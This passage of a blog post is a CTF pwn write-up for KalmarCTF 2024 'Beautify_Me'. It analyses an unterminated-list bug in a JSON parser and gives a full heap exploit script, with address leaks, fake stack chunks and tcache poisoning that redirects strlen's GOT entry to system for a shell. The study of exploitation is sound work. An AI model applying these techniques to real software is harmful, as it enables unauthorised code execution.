+<p>来到崩溃点, 看到curr的值, 一眼看出这个奇怪的地址是Tcache Safe-Linking的产物, 初步判断是有一个UAF.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20240812101351.png"></p>
+<p>但查询bin发现并没有tcachebins, 再加上这是在遍历链表, 那么判断应该是有未初始化或者链表节点next域没置空的问题.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20240812101744.png"></p>
+<p>跟着Fuzz出的POC调一下, 找到漏洞点在 parse_array_element函数处理不完整数组的情况.<br>如果数组不以 ] 结尾, 则最后一个链表节点的next域不会被置空, 且返回了s而不是NULL, 意味着该错误不会被上层识别到.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">parse_array_element</span> <span class="params">(<span class="type">char</span> *s, <span class="type">array_t</span> **out)</span> {</span><br><span class="line">    <span class="type">array_t</span> *elem = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">array_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (elem == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    s = parse_value(s, &amp;elem-&gt;value);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">free</span>(elem);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">']'</span>) {</span><br><span class="line">        elem-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        *out = elem;</span><br><span class="line">        <span class="keyword">return</span> ++s;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">','</span>) {</span><br><span class="line">        s = skip_whitespace(++s);</span><br><span class="line">        s = parse_array_element(s, &amp;elem-&gt;next);</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">            free_value(elem-&gt;value);</span><br><span class="line">            <span class="built_in">free</span>(elem);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *out = elem;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>相近的函数parse_object_element的写法仍未清空next,但在对象不完整的情况下会返回NULL而被上层处理,不存在问题.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">parse_object_element</span> <span class="params">(<span class="type">char</span> *s, <span class="type">object_t</span> **out)</span> {</span><br><span class="line">    <span class="type">object_t</span> *elem = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">object_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (elem == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    s = parse_value(s, &amp;elem-&gt;key);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">free</span>(elem);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s != <span class="string">':'</span>) {</span><br><span class="line">        free_value(elem-&gt;key);</span><br><span class="line">        <span class="built_in">free</span>(elem);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s = skip_whitespace(++s);</span><br><span class="line"></span><br><span class="line">    s = parse_value(s, &amp;elem-&gt;value);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">        free_value(elem-&gt;key);</span><br><span class="line">        <span class="built_in">free</span>(elem);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">'}'</span>) {</span><br><span class="line">        elem-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        *out = elem;</span><br><span class="line">        <span class="keyword">return</span> ++s;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">','</span>) {</span><br><span class="line">        s = skip_whitespace(++s);</span><br><span class="line">        s = parse_object_element(s, &amp;elem-&gt;next);</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">            free_value(elem-&gt;key);</span><br><span class="line">            free_value(elem-&gt;value);</span><br><span class="line">            <span class="built_in">free</span>(elem);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        }</span><br><span class="line">        *out = elem;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>简化一下POC:<br>第一行污染next字段.<br>第二行构造不完整数组.</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">[ ""</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>next指针未置空, 一般可以来构造任意写.<br>但分析一下会发现: elem来自malloc, 且array_t-&gt;next指针的位置与Tcache-&gt;next重合.<br>似乎意味着elem-&gt;next一定是一个Safe-Linking后的指针, 没办法直接使用也没办法像TSCTF2024-BuggyAllocator那样提前布置. </p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">parse_array_element</span> <span class="params">(<span class="type">char</span> *s, <span class="type">array_t</span> **out)</span> {</span><br><span class="line">    <span class="type">array_t</span> *elem = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">array_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (elem == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    s = parse_value(s, &amp;elem-&gt;value);</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">free</span>(elem);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s = skip_whitespace(s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">']'</span>) {</span><br><span class="line">        elem-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        *out = elem;</span><br><span class="line">        <span class="keyword">return</span> ++s;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (*s == <span class="string">','</span>) {</span><br><span class="line">        s = skip_whitespace(++s);</span><br><span class="line">        s = parse_array_element(s, &amp;elem-&gt;next);</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">NULL</span>) {</span><br><span class="line">            free_value(elem-&gt;value);</span><br><span class="line">            <span class="built_in">free</span>(elem);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *out = elem;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>但其实可以利用和topchunk合并的方式来避免布置的数据被next指针(或者说fd)覆盖.</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'"%s"\n'</span> % (<span class="string">b'A'</span>*<span class="number">0x410</span>)</span><br><span class="line">payload += <span class="string">b'[ ""'</span> + <span class="string">b'\n'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20240812142204.png"></p>
+<p>但查找对array-&gt;next的引用并加以分析, 发现我们唯一拥有的原语是每次解析输出后, 自顶而下释放资源时的任意地址释放.</p>
+<p>至此完成泄露+任意读+任意地址释放原语的分析.</p>
+<p>下面开始编写EXP.<br>先用array类型来混淆泄露出一个堆指针.<br>再用INT类型来混淆读出堆上残留的libc地址.<br>再次用INT类型来混淆读出libc中保存的栈地址.</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heapbase</span></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'[1,2]'</span> + <span class="string">b'\n'</span>  <span class="comment"># padding, 避免array-&gt;next低位为00而无法泄露</span></span><br><span class="line">payload += <span class="string">b'["%s" , "padding"]\n'</span> % (<span class="string">b'A'</span>*<span class="number">0x420</span>)</span><br><span class="line">payload += <span class="string">b'{ [1,2] : 2} '</span> + <span class="string">b'\n'</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">ru(<span class="string">'padding"\n'</span>)</span><br><span class="line">r(<span class="number">11</span>)</span><br><span class="line">heap_base = uu64()-<span class="number">0x1740</span></span><br><span class="line">lg(<span class="string">"heap_base:"</span>,heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libcbase</span></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'{ %ld : 2} '</span> % (heap_base+<span class="number">0x17a0</span>) + <span class="string">b'\n'</span></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,l64()-<span class="number">0x21ace0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stackbuf</span></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'{ %ld : 2} '</span> % (p.environ_addr) + <span class="string">b'\n'</span></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">stackbuf = l64()-<span class="number">0x1138</span></span><br><span class="line">lg(<span class="string">"stack:"</span>,stackbuf)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>2.35下如何使用这个任意地址释放原语呢?<br>直观想法(其实是低版本用house of spirit打malloc_hook的经验)有两个: 一是有合法的size字段能使其正常释放, 二是对RCE有帮助.</p>
+<p>2.35下的对齐检查使得难以通过字节错位来找到合适的size域, 而对RCE有帮助的一般是io_list_all, libc_got,和在堆上分配的File结构体.<br>本题中这些地方都找不到合适的size域.</p>
+<p>于是还是回退到打堆管理器来转化成任意地址写: 伪造堆块放入tcache, 再更改next指针.<br>然而由于缺乏堆上的写原语(字符串向堆上拷贝时的00截断), 导致完成这一操作非常困难.</p>
+<p>好在主循环中可以往栈上写入任意数据.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>于是伪造相关数据结构使得print_value和free_value时不会崩溃, 并最终使得两个栈上的伪堆块进入fastbin中.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20240822141517.png"></p>
+<p>至此基本利用分析完毕, 后面都是一些繁琐的调堆过程, 最终打libc中strlen的got表来getshell.</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heapbase</span></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'[1,2]'</span> + <span class="string">b'\n'</span>  <span class="comment"># padding, 避免array-&gt;next低位为00而无法泄露</span></span><br><span class="line">payload += <span class="string">b'["%s" , "padding"]\n'</span> % (<span class="string">b'A'</span>*<span class="number">0x420</span>)</span><br><span class="line">payload += <span class="string">b'{ [1,2] : 2} '</span> + <span class="string">b'\n'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">ru(<span class="string">'padding"\n'</span>)</span><br><span class="line">r(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">heap_base = uu64()-<span class="number">0x1740</span></span><br><span class="line">lg(<span class="string">"heap_base:"</span>,heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libcbase</span></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'{ %ld : 2} '</span> % (heap_base+<span class="number">0x17a0</span>) + <span class="string">b'\n'</span></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,l64()-<span class="number">0x21ace0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stackbuf</span></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'{ %ld : 2} '</span> % (p.environ_addr) + <span class="string">b'\n'</span></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line">stackbuf = l64()-<span class="number">0x1138</span></span><br><span class="line">lg(<span class="string">"stack:"</span>,stackbuf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare array_t-&gt;next ptr</span></span><br><span class="line">fake_chunk_addr = stackbuf+<span class="number">0xa10</span></span><br><span class="line">pay2 = <span class="string">b'A'</span>*<span class="number">0x410</span>+p64(fake_chunk_addr)[:<span class="number">6</span>]</span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'[1,2,3,"%s","%s"]'</span> % (<span class="string">b'A'</span>*<span class="number">0x3C0</span>,pay2) + <span class="string">b'\n'</span></span><br><span class="line"><span class="comment"># payload += b'"%s"\n' % (b'A'*0x410)</span></span><br><span class="line"><span class="comment"># payload += b'[ ""' + b'\n'</span></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake something need and trigger the release</span></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'[1,2,3,"%s","%s",4,"" '</span> % (<span class="string">b'A'</span>*<span class="number">0x3c0</span>,<span class="string">b'A'</span>*<span class="number">0x3C0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x9f8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b'snowfall'</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x21</span>) <span class="comment">#fake_size</span></span><br><span class="line"></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) <span class="comment">#array_t-&gt;next</span></span><br><span class="line">fake_chunk += p64(stackbuf+<span class="number">0xa30</span>) <span class="comment">#array_t-&gt;value</span></span><br><span class="line"></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x21</span>) <span class="comment">#fake_size</span></span><br><span class="line"></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) <span class="comment">#json_t-&gt;type</span></span><br><span class="line"></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x21</span>) <span class="comment">#fake_size</span></span><br><span class="line">fake_chunk = fake_chunk.ljust(<span class="number">0x68</span>,<span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += fake_chunk</span><br><span class="line">payload += <span class="string">b'\n'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># transform fake_chunk from fastbin to tcache</span></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'[1,2,3,4,5,6]'</span></span><br><span class="line">payload += <span class="string">b'\n'</span></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tcache poisoning to hijack strlen_got to system</span></span><br><span class="line">streln_got = p.libc_base+<span class="number">0x21a090</span> <span class="comment">#21a098</span></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'["%s","%s"]'</span> % (<span class="string">b'/bin/sh'</span>,<span class="string">b'a'</span>*<span class="number">8</span>+p64(p.system_addr)[:<span class="number">6</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xa30</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += p64(p.mangle(stackbuf+<span class="number">0xa20</span>,streln_got))</span><br><span class="line">payload += <span class="string">b'\n'</span></span><br><span class="line">sa(<span class="string">'&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2024/KalmarCTF2024%20Beautify_Me/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/Linux%20-%20pagetable%20mapping%20establishment%20--%20ARM64%20v5.0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Linux内核  页表映射建立过程 -- ARM64 v5.0
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/m0leConFinals%202023%20Keasy%20CrossCache%20UAF%20+%20DirtyPagetable/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">m0leConFinals 2023 Keasy CrossCache UAF + DirtyPagetable</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2024
+        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2022/About">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
